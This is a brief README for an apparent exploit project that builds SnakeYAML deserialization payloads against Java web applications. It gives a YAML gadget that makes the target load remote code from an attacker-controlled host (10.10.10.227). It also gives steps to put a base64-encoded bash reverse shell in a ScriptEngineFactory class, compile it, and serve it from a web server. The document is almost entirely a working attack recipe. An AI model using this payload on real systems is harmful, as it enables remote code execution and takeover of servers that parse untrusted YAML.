# yaml-parser-payload
payload parser yaml javaweb


A tiny project for generating payloads for the SnakeYAML deserialization gadget (taken from https://github.com/mbechler/marshalsec):

-------yaml parser javaweb------------
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.10.227/"]
  ]]
]
```
edit AwesomeScriptEngineFactory.java and put reverse shell in bash  

in this page encode reverse shell  in base64 http://www.jackson-t.ca/runtime-exec-payloads.html

and compile:

------bash console-----
```bash
javac AwesomeScriptEngineFactory.java
```
```tree
 exploit /
  |-->      META-INF/services/javax.script.ScriptEngineFactory inside file put h1dr0.AwesomeScriptEngineFactory/
  |-->      h1dr0/AwesomeScriptEngineFactory.class
```
Then place the 'AwesomeScriptEngineFactory.class' file in to the web server folder (e.g. h1dr0/AwesomeScriptEngineFactory.class)
